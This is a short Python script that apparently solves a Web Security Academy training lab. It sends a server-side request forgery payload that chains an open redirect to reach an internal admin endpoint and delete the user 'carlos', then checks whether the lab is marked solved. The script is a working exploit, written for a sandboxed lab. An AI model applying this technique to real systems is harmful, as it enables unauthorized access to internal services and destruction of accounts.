import requests
import argparse

parser = argparse.ArgumentParser(description='Solves the following Lab: SSRF with filter bypass via open redirection vulnerability')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

r = requests.post("https://" + lab.id + ".web-security-academy.net/product/stock", data={'stockApi':'/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/delete?username=carlos'}, allow_redirects=0)

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab.")
